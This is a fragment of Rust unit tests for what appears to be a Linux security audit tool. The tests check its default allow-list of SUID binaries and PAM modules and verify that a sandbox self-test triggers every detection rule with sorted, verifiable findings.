fn whitelist_knows_nvidia_and_wtmpdb() {
    let cfg = Config::default();
    assert!(cfg.is_suid_allowed("/usr/bin/nvidia-modprobe"));
    assert!(cfg.allowed_pam_modules.iter().any(|m| m == "pam_wtmpdb"));
}

// ------------------------------------------------------------ the whole sandbox

#[test]
fn sandbox_self_test_triggers_every_rule() {
    let res = sandbox::run_self_test(&|_| {}).expect("self-test");
    let failed: Vec<&str> = res.checks.iter().filter(|c| !c.passed).map(|c| c.rule.as_str()).collect();
    assert!(failed.is_empty(), "rules that did not fire: {failed:?}");
    assert!(res.report.findings.windows(2).all(|w| w[0].severity >= w[1].severity));
    assert!(res.report.findings.iter().all(|f| !f.verify.is_empty() || f.rule.starts_with("EXT-")), "every finding should have verification commands");
}
